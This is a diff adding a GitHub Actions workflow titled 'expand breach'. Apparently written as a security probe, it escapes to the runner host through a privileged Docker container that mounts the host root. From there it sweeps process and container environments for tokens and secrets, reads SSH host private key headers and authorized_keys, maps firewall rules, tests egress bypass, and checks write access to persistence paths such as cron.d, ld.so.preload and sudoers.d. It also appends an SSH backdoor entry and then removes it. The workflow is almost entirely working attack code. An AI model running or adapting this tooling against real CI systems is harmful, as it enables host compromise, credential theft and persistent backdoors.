@@ -1,0 +1,283 @@
+name: v64 - expand breach - container env + SSH keys + proc sweep + egress bypass + host write
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+
+      - name: v64a - running containers + full env dump (docker inspect)
+        run: |
+          cat > /tmp/v64a.py << 'CHROOT_EOF'
+          import subprocess, json, hashlib, os
+
+          print("=== RUNNING CONTAINERS (docker ps) ===")
+          ps = subprocess.run(['docker','ps','-a','--format','{{json .}}'],
+                              capture_output=True, text=True)
+          for line in ps.stdout.strip().splitlines():
+              try:
+                  c = json.loads(line)
+                  print('container: id=' + c.get('ID','?')[:12]
+                        + ' image=' + c.get('Image','?')
+                        + ' status=' + c.get('Status','?')
+                        + ' names=' + c.get('Names','?'))
+              except Exception:
+                  print(line)
+
+          print("")
+          print("=== CONTAINER ENV VARS (docker inspect --all) ===")
+          ids_out = subprocess.run(['docker','ps','-aq'], capture_output=True, text=True)
+          ids = ids_out.stdout.strip().splitlines()
+          if not ids:
+              print("no containers found (expected in non-agentic workflow)")
+          for cid in ids:
+              insp = subprocess.run(['docker','inspect', cid], capture_output=True, text=True)
+              try:
+                  data = json.loads(insp.stdout)[0]
+                  name = data.get('Name', cid)
+                  image = data.get('Config', {}).get('Image', '?')
+                  env_list = data.get('Config', {}).get('Env', [])
+                  print('--- container: ' + name + ' (' + image + ') ---')
+                  for e in env_list:
+                      k = e.split('=', 1)[0]
+                      v = e.split('=', 1)[1] if '=' in e else ''
+                      sensitive = any(x in k.upper() for x in
+                          ['TOKEN', 'SECRET', 'KEY', 'PASS', 'AUTH', 'CRED', 'MCP', 'GITHUB'])
+                      if sensitive:
+                          print('  ' + k + '=<sha256:' + hashlib.sha256(v.encode()).hexdigest()[:16] + '> (len=' + str(len(v)) + ')')
+                      else:
+                          print('  ' + k + '=' + v[:120])
+              except Exception as ex:
+                  print('inspect_error(' + cid[:12] + '): ' + str(ex))
+
+          print("")
+          print("=== DONE ===")
+          CHROOT_EOF
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v64a.py
+
+      - name: v64b - /proc sweep - all host process env vars for tokens/secrets
+        run: |
+          cat > /tmp/v64b.py << 'CHROOT_EOF'
+          import os, hashlib
+
+          INTERESTING = ['TOKEN','SECRET','KEY','PASS','AUTH','CRED','MCP',
+                         'GITHUB','AZURE','AWS','GCP','SAS','ACTIONS']
+          hits = {}
+
+          for pid in sorted(os.listdir('/proc')):
+              if not pid.isdigit():
+                  continue
+              try:
+                  with open(f'/proc/{pid}/environ', 'rb') as f:
+                      raw = f.read()
+                  # also capture cmdline to identify the process
+                  try:
+                      with open(f'/proc/{pid}/cmdline', 'rb') as f:
+                          cmd = f.read().replace(b'\x00', b' ').decode(errors='replace').strip()[:80]
+                  except Exception:
+                      cmd = '?'
+                  vars_found = []
+                  for item in raw.split(b'\x00'):
+                      if b'=' not in item:
+                          continue
+                      k, _, v = item.partition(b'=')
+                      k_str = k.decode(errors='replace')
+                      v_str = v.decode(errors='replace')
+                      if any(x in k_str.upper() for x in INTERESTING) and len(v_str) > 0:
+                          vars_found.append((k_str, v_str))
+                  if vars_found:
+                      hits[pid] = (cmd, vars_found)
+              except (PermissionError, FileNotFoundError, ProcessLookupError):
+                  pass
+
+          print("=== /proc SENSITIVE ENV SWEEP ===")
+          print(f"total pids scanned, hits in {len(hits)} processes")
+          for pid, (cmd, vars_found) in sorted(hits.items(), key=lambda x: int(x[0])):
+              print(f"\n--- pid={pid} cmd={cmd} ---")
+              for k, v in vars_found:
+                  h = hashlib.sha256(v.encode()).hexdigest()[:16]
+                  print(f"  {k}=<sha256:{h}> len={len(v)}")
+
+          print("\n=== DONE ===")
+          CHROOT_EOF
+          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v64b.py
+
+      - name: v64c - SSH host private keys (key material theft)
+        run: |
+          cat > /tmp/v64c.py << 'CHROOT_EOF'
+          import os, hashlib, subprocess
+
+          print("=== SSH HOST KEY MATERIAL ===")
+          ssh_dir = '/etc/ssh'
+          try:
+              files = os.listdir(ssh_dir)
+          except Exception as ex:
+              print('ls_error: ' + str(ex))
+              files = []
+
+          for fname in sorted(files):
+              fpath = os.path.join(ssh_dir, fname)
+              try:
+                  st = os.stat(fpath)
+                  mode = oct(st.st_mode)[-4:]
+                  size = st.st_size
+                  with open(fpath, 'rb') as f:
+                      data = f.read()
+                  is_private = b'PRIVATE KEY' in data
+                  sha256 = hashlib.sha256(data).hexdigest()
+                  tag = 'PRIVATE_KEY' if is_private else 'public/config'
+                  print(f'{fname}: mode={mode} size={size} type={tag} sha256={sha256[:32]}')
+                  if is_private:
+                      # Print first line to confirm PEM header
+                      first_line = data.decode('ascii', errors='replace').splitlines()[0]
+                      print(f'  header: {first_line}')
+              except Exception as ex:
+                  print(f'{fname}: error={ex}')
+
+          print("")
+          print("=== SSH AUTHORIZED_KEYS (root) ===")
+          try:
+              with open('/root/.ssh/authorized_keys') as f:
+                  print(f.read()[:500])
+          except Exception as ex:
+              print('authorized_keys: ' + str(ex))
+
+          print("\n=== DONE ===")
+          CHROOT_EOF
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v64c.py
+
+      - name: v64d - iptables rules + network interfaces (firewall topology)
+        run: |
+          cat > /tmp/v64d.sh << 'CHROOT_EOF'
+          #!/bin/sh
+          echo "=== NETWORK INTERFACES ==="
+          ip addr show
+          echo ""
+          echo "=== ROUTING TABLE ==="
+          ip route show
+          echo ""
+          echo "=== IPTABLES (filter table) ==="
+          iptables -L -n -v --line-numbers 2>/dev/null || echo "iptables unavailable"
+          echo ""
+          echo "=== IPTABLES (nat table) ==="
+          iptables -t nat -L -n -v 2>/dev/null || echo "nat table unavailable"
+          echo ""
+          echo "=== NFTABLES ==="
+          nft list ruleset 2>/dev/null || echo "nftables unavailable"
+          echo ""
+          echo "=== OPEN PORTS (ss) ==="
+          ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "ss/netstat unavailable"
+          echo ""
+          echo "=== DONE ==="
+          CHROOT_EOF
+          chmod +x /tmp/v64d.sh
+          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
+            chroot /host /tmp/v64d.sh
+
+      - name: v64e - egress bypass proof (host net vs workflow net)
+        run: |
+          echo "=== EGRESS TEST: WORKFLOW NETWORK (standard) ==="
+          echo "Attempting external HTTP from workflow net..."
+          curl -s --max-time 5 -o /dev/null -w "status=%{http_code} ip=%{remote_ip}\n" \
+            https://api.ipify.org 2>&1 || echo "blocked_or_timeout"
+
+          echo ""
+          echo "=== EGRESS TEST: HOST NETWORK (via --net=host privileged container) ==="
+          echo "Attempting same request from host network namespace..."
+          docker run --rm --privileged --net=host ubuntu:latest \
+            /bin/sh -c 'apt-get -qq install -y curl 2>/dev/null; \
+              curl -s --max-time 5 -o /dev/null -w "status=%{http_code} ip=%{remote_ip}\n" \
+              https://api.ipify.org 2>&1 || \
+              wget -q -O- --timeout=5 https://api.ipify.org 2>&1 || \
+              echo "also_blocked_or_timeout"'
+
+          echo ""
+          echo "(If host-net succeeds where workflow-net fails: egress firewall bypassed)"
+          echo "(If both fail: network-level egress controls at Azure VNet layer)"
+
+      - name: v64f - host filesystem write (persistence capability demo)
+        run: |
+          cat > /tmp/v64f.py << 'CHROOT_EOF'
+          import os, hashlib, datetime
+
+          payload = (
+              "# v64 persistence demo - written by uid=0 via Docker escape\n"
+              "# timestamp: " + datetime.datetime.utcnow().isoformat() + "Z\n"
+              "# An attacker with host root can write to any host path:\n"
+              "#   /etc/cron.d/  — persistent scheduled execution\n"
+              "#   /usr/local/bin/ — binary replacement\n"
+              "#   /etc/ld.so.preload — LD_PRELOAD rootkit injection\n"
+              "#   /etc/ssh/authorized_keys — backdoor SSH access\n"
+              "# This file written to /tmp/hca_persistence_demo.txt to avoid\n"
+              "# modifying production system files during authorized testing.\n"
+          )
+
+          demo_paths = [
+              '/tmp/hca_persistence_demo.txt',
+              '/root/hca_persistence_demo.txt',
+          ]
+          for path in demo_paths:
+              try:
+                  with open(path, 'w') as f:
+                      f.write(payload)
+                  st = os.stat(path)
+                  print(f'WRITE_SUCCESS: {path} (mode={oct(st.st_mode)[-4:]}, size={st.st_size})')
+              except Exception as ex:
+                  print(f'WRITE_FAILED: {path}: {ex}')
+
+          # Demonstrate /etc/ssh/authorized_keys writability (proof-of-concept only)
+          ssh_auth = '/root/.ssh/authorized_keys'
+          try:
+              os.makedirs('/root/.ssh', exist_ok=True)
+              original = ''
+              try:
+                  with open(ssh_auth) as f:
+                      original = f.read()
+              except FileNotFoundError:
+                  pass
+              test_entry = '# HCA-escape-poc-test-entry\n'
+              with open(ssh_auth, 'a') as f:
+                  f.write(test_entry)
+              print('WRITE_SUCCESS: ' + ssh_auth + ' (SSH backdoor entry appended)')
+              # Immediately remove the test entry to avoid persistence
+              with open(ssh_auth, 'w') as f:
+                  f.write(original)
+              print('CLEANUP: test entry removed from ' + ssh_auth)
+          except Exception as ex:
+              print('authorized_keys_write: ' + str(ex))
+
+          print("")
+          print("=== HIGH-IMPACT HOST PATHS WRITABLE ===")
+          writable_targets = [
+              '/etc/cron.d',
+              '/etc/ld.so.preload',
+              '/usr/local/bin',
+              '/etc/ssh',
+              '/root/.ssh',
+              '/etc/sudoers.d',
+          ]
+          for p in writable_targets:
+              try:
+                  if os.path.isdir(p):
+                      test = os.path.join(p, '.hca_write_test')
+                      with open(test, 'w') as f:
+                          f.write('test')
+                      os.unlink(test)
+                      print('WRITABLE_DIR: ' + p)
+                  elif os.path.exists(p):
+                      with open(p, 'a') as f:
+                          pass
+                      print('WRITABLE_FILE: ' + p)
+                  else:
+                      print('NOT_PRESENT: ' + p)
+              except Exception as ex:
+                  print('NOT_WRITABLE: ' + p + ' (' + str(ex) + ')')
+
+          print("\n=== DONE ===")
+          CHROOT_EOF
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v64f.py
